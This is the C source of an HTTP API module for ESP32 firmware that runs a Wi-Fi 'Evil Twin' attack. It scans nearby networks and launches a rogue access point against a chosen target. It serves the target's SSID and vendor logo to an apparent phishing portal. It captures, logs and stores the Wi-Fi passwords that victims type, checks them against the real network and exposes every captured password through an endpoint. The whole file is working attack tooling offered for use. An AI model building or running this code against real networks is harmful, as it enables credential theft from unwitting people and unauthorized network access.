#include <string.h>
#include "esp_http_server.h"
#include "esp_log.h"
#include "cJSON.h"
#include "utils.h"
#include "config.h"
#include "evil_twin.h"
#include "server_api.h"
#include "passwordMng.h"
#include "esp_sleep.h"
#include "vendors.h"


static const char *TAG = "SERVER_API";


const char* mime_from_path(const char* path) {
    if (strstr(path, ".html")) return "text/html";
    if (strstr(path, ".css"))  return "text/css";
    if (strstr(path, ".js"))   return "application/javascript";
    if (strstr(path, ".png"))  return "image/png";
    if (strstr(path, ".jpg"))  return "image/jpeg";
    if (strstr(path, ".ico"))  return "image/x-icon";
    if (strstr(path, ".svg"))  return "image/svg+xml";
    return "text/plain";
}


static esp_err_t cors_prevention_handler(httpd_req_t *req)
{
    httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Methods", "POST, OPTIONS");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Headers", "Content-Type");
    return httpd_resp_send(req, NULL, 0);
}


static esp_err_t admin_get_ap_settings(httpd_req_t *req) 
{
    char ssid[32] = {0};
    char password[64] = {0};
    int32_t channel = 1;

    /* Read value from flash */
    if( read_string_from_flash("wifi_ssid", ssid) != ESP_OK )
    {
        strcpy(ssid, DEFAULT_WIFI_SSID);
    }
    if( read_string_from_flash("wifi_pass", password) != ESP_OK )
    {
        strcpy(password, DEFAULT_WIFI_PASS);
    }
    if( read_int_from_flash("wifi_chan", &channel) != ESP_OK )
    {
        channel = DEFAULT_WIFI_CHAN;
    }

    cJSON *root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "ssid", ssid);
    cJSON_AddStringToObject(root, "password", password);
    cJSON_AddNumberToObject(root, "channel", channel);
    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (!json_response) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "JSON alloc failed");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, json_response, HTTPD_RESP_USE_STRLEN);
    free(json_response);
    return ESP_OK;
}


static esp_err_t admin_set_ap_settings(httpd_req_t *req)
{
    int total_len = req->content_len;
    int cur_len = 0;
    int ret;

    if (total_len <= 0 || total_len > 1024) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid body");
        return ESP_OK;
    }
    char *buf = malloc(total_len + 1);
    if (!buf) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "No mem");
        return ESP_OK;
    }

    while (cur_len < total_len) {
        ret = httpd_req_recv(req, buf + cur_len, total_len - cur_len);
        if (ret <= 0) {
            if (ret == HTTPD_SOCK_ERR_TIMEOUT) {
                continue;
            }
            free(buf);
            httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Recv error");
            return ESP_OK;
        }
        cur_len += ret;
    }
    buf[total_len] = '\0';

    cJSON *root = cJSON_Parse(buf);
    if (!root) {
        free(buf);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_OK;
    }
    const cJSON *j_ssid = cJSON_GetObjectItemCaseSensitive(root, "ssid");
    const cJSON *j_password = cJSON_GetObjectItemCaseSensitive(root, "password");
    const cJSON *j_channel = cJSON_GetObjectItemCaseSensitive(root, "channel");

    char ssid[64] = {0};
    char password[64] = {0};
    int channel = 1;
    if (cJSON_IsString(j_ssid)) {
        strlcpy(ssid, j_ssid->valuestring, sizeof(ssid));
    }
    if (cJSON_IsString(j_password)) {
        strlcpy(password, j_password->valuestring, sizeof(password));
    }
    if (cJSON_IsNumber(j_channel)) {
        channel = j_channel->valueint;
    }
    cJSON_Delete(root);
    free(buf);
    
    /* Save new settings */
    save_string_to_flash(WIFI_SSID_KEY, ssid);
    save_string_to_flash(WIFI_PASS_KEY, password);
    save_int_to_flash(WIFI_CHAN_KEY, channel);
    
    /* Send response */
    httpd_resp_send(req, "Settings updated successfully!\nRestart the device to make it effective!", HTTPD_RESP_USE_STRLEN);
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
} 


static esp_err_t targets_scan_handler(httpd_req_t *req)
{
    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = false,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time.active.min = 100,
        .scan_time.active.max = 300,
        .home_chan_dwell_time = 100,
    };

    esp_err_t err = esp_wifi_scan_start(&scan_config, true);
    if (err != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "esp_wifi_scan_start failed");
        return err;
    }

    uint16_t ap_count = 0;
    err = esp_wifi_scan_get_ap_num(&ap_count);
    if (err != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "esp_wifi_scan_get_ap_num failed");
        return err;
    }

    wifi_ap_record_t *ap_records = NULL;
    if (ap_count > 0) {
        ap_records = (wifi_ap_record_t *)calloc(ap_count, sizeof(wifi_ap_record_t));
        if (!ap_records) {
            httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "out of memory (ap_records)");
            return ESP_ERR_NO_MEM;
        }

        err = esp_wifi_scan_get_ap_records(&ap_count, ap_records);
        if (err != ESP_OK) {
            free(ap_records);
            httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "esp_wifi_scan_get_ap_records failed");
            return err;
        }
    }

    cJSON *root = cJSON_CreateArray();
    if (!root) {
        free(ap_records);
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "cJSON_CreateArray failed");
        return ESP_FAIL;
    }

    for (int i = 0; i < ap_count; i++) {
        char ssid[33];
        memcpy(ssid, ap_records[i].ssid, sizeof(ap_records[i].ssid));
        ssid[32] = '\0';

        char bssid[18];
        snprintf(bssid, sizeof(bssid),
                 "%02X:%02X:%02X:%02X:%02X:%02X",
                 ap_records[i].bssid[0], ap_records[i].bssid[1], ap_records[i].bssid[2],
                 ap_records[i].bssid[3], ap_records[i].bssid[4], ap_records[i].bssid[5]);

        cJSON *obj = cJSON_CreateObject();
        if (!obj) {
            cJSON_Delete(root);
            free(ap_records);
            httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "cJSON_CreateObject failed");
            return ESP_FAIL;
        }

        cJSON_AddStringToObject(obj, "ssid", ssid);
        cJSON_AddNumberToObject(obj, "signal", ap_records[i].rssi);
        cJSON_AddNumberToObject(obj, "channel", ap_records[i].primary);
        cJSON_AddStringToObject(obj, "bssid", bssid);
        cJSON_AddStringToObject(obj, "authmode", authmode_to_str(ap_records[i].authmode));
        cJSON_AddNumberToObject(obj, "authmode_code", ap_records[i].authmode);
        cJSON_AddNumberToObject(obj, "pairwise_cipher", ap_records[i].pairwise_cipher);
        cJSON_AddNumberToObject(obj, "group_cipher", ap_records[i].group_cipher);
        cJSON_AddBoolToObject(obj, "wps", ap_records[i].wps ? 1 : 0);
        cJSON_AddItemToArray(root, obj);
    }

    char *json = cJSON_PrintUnformatted(root);
    if (!json) {
        cJSON_Delete(root);
        free(ap_records);
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "cJSON_PrintUnformatted failed");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, json, HTTPD_RESP_USE_STRLEN);

    free(json);
    cJSON_Delete(root);
    free(ap_records);

    return ESP_OK;
}


static esp_err_t evil_twin_handler(httpd_req_t *req) 
{
    char buffer[300];
    unsigned int auth_tmp = 0;
    int ret = httpd_req_recv(req, buffer, sizeof(buffer) - 1);
    if (ret <= 0) {
        if (ret == HTTPD_SOCK_ERR_TIMEOUT) {
            httpd_resp_send_408(req);
        }
        return ESP_FAIL;
    }
    buffer[ret] = '\0';
    char bssid[64] = {0};
    target_info_t target_info = { 0 };
    sscanf(buffer,"ssid=%32[^&]&bssid=%17[^&]&channel=%hhu&signal=%hhd&authmode_code=%u&group=%hhu&pairwise=%hhu&scheme=%hhd", 
    target_info.ssid, bssid, &target_info.channel, &target_info.rssi, &auth_tmp, (unsigned char *)&target_info.group_cipher, (unsigned char *)&target_info.pairwise_cipher, &target_info.attack_scheme);

    target_info.authmode = (wifi_auth_mode_t)auth_tmp;
    ESP_LOGI(TAG, "Starting Evil Twin attack on SSID: %s, BSSID: %s, Channel: %d, Signal: %d, Authmode: %s",
             target_info.ssid, bssid, target_info.channel, target_info.rssi, authmode_to_str(target_info.authmode));

    if (sscanf(bssid, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &target_info.bssid[0], &target_info.bssid[1], &target_info.bssid[2],
               &target_info.bssid[3], &target_info.bssid[4], &target_info.bssid[5]) != 6) {
        ESP_LOGE(TAG, "Errore nel parsing del BSSID\n");
        return ESP_FAIL;
    }

    httpd_resp_sendstr(req, "EvilTwin attack is started, this page will no longer be enabled until device reset.");
    httpd_resp_send(req, NULL, 0);

    /* Start evil twin attack */
    evil_twin_start_attack(&target_info);

    return ESP_OK;
}


static esp_err_t get_password_handler(httpd_req_t *req) 
{
    password_manager_read_passwords(req);
    return ESP_OK;
}


static esp_err_t get_evlitwin_target_handler(httpd_req_t *req)
{
    target_info_t *target = evil_twin_get_target_info();

    /* Logo path */
    char path[64];
    strlcpy(path, "/logo/", sizeof(path));
    strlcat(path, vendorToString(target->vendor), sizeof(path));
    strlcat(path, ".png", sizeof(path));

    cJSON *root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "logo", path);
    cJSON_AddStringToObject(root, "ssid", (const char*)target->ssid);
    cJSON_AddStringToObject(root, "vendor", vendorToString(target->vendor));
    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (!json_response) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "JSON alloc failed");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, json_response, HTTPD_RESP_USE_STRLEN);
    free(json_response);
    return ESP_OK;
}


static void shutdown_task(void *pvParameter)
{
    vTaskDelay(pdMS_TO_TICKS(1000));
    evil_twin_stop_attack();

    /* Enter in deep sleep to preserve battery power */
    /* Only hardware wakeup (Reset button) */
    //esp_deep_sleep_start();

    vTaskDelete(NULL);
}


static esp_err_t check_input_password_handler(httpd_req_t *req)
{
    target_info_t *target = evil_twin_get_target_info();

	char buffer[256] = { 0 };
    int ret = 0;

    ret = httpd_req_recv(req, buffer, sizeof(buffer) - 1);
    if (ret <= 0) {
        if (ret == HTTPD_SOCK_ERR_TIMEOUT) {
            httpd_resp_send_408(req);
        }
        return ESP_FAIL;
    }

	char password[64] = { 0 };
    sscanf(buffer, "password=%63[^&]", password);

	/* Save password */
	memset(&buffer, 0, sizeof(buffer));
	snprintf(buffer, sizeof(buffer), "%s,%02X:%02X:%02X:%02X:%02X:%02X,%s", (const char *)target->ssid, target->bssid[0], target->bssid[1], target->bssid[2], target->bssid[3], target->bssid[4], target->bssid[5], password);
	password_manager_save(buffer);
	ESP_LOGI(TAG, "Password saved: %s", buffer);

	/* Check password and send response */
	if( evil_twin_check_password(password) == true )
	{
		httpd_resp_send(req, "ok", HTTPD_RESP_USE_STRLEN);
		httpd_resp_send(req, NULL, 0);

        /* Stop attack and restore */
        xTaskCreate(shutdown_task, "shutdown_task", 4096, NULL, 5, NULL);
	}
	else
	{
		httpd_resp_send(req, "bad", HTTPD_RESP_USE_STRLEN);
		httpd_resp_send(req, NULL, 0);
	}
	return ESP_OK;
}


esp_err_t register_server_api_handlers(httpd_handle_t server)
{
    /* Handler for CORS preflight requests */
    httpd_uri_t cors_preflight_uri = {
        .uri = "/*",
        .method = HTTP_OPTIONS,
        .handler = cors_prevention_handler,
        .user_ctx = NULL
    };
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &cors_preflight_uri));

    /* Handler for get AP settings */
    httpd_uri_t get_ap_settings_uri = {
        .uri = "/api/ap_settings/get",
        .method = HTTP_GET,
        .handler = admin_get_ap_settings,
        .user_ctx = NULL
    };
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &get_ap_settings_uri));

    /* Handler for set AP settings */
    httpd_uri_t set_ap_settings_uri = {
        .uri = "/api/ap_settings/set",
        .method = HTTP_POST,
        .handler = admin_set_ap_settings,
        .user_ctx = NULL
    };
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &set_ap_settings_uri));

    httpd_uri_t targets_scan_uri = {
        .uri = "/api/wifi_scan",
        .method = HTTP_GET,
        .handler = targets_scan_handler,
        .user_ctx = NULL
    };
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &targets_scan_uri));

    /* Handler for starting evil twin attack */
    httpd_uri_t evil_twin_uri = {
        .uri = "/api/evil_twin",
        .method = HTTP_POST,
        .handler = evil_twin_handler,
        .user_ctx = NULL
    };
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &evil_twin_uri));

    /* Get saved password */
    httpd_uri_t get_password_uri = {
        .uri = "/get_passwords",
        .method = HTTP_POST,
        .handler = get_password_handler,
        .user_ctx = NULL
    };
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &get_password_uri));

    /* Get vendor string */
    httpd_uri_t get_evlitwin_target = {
        .uri = "/api/get_evlitwin_target",
        .method = HTTP_GET,
        .handler = get_evlitwin_target_handler,
        .user_ctx = NULL
    };
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &get_evlitwin_target));

    /* Get vendor string */
    httpd_uri_t check_input_password = {
        .uri = "/api/check_input_password",
        .method = HTTP_POST,
        .handler = check_input_password_handler,
        .user_ctx = NULL
    };
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &check_input_password));

    return ESP_OK;
}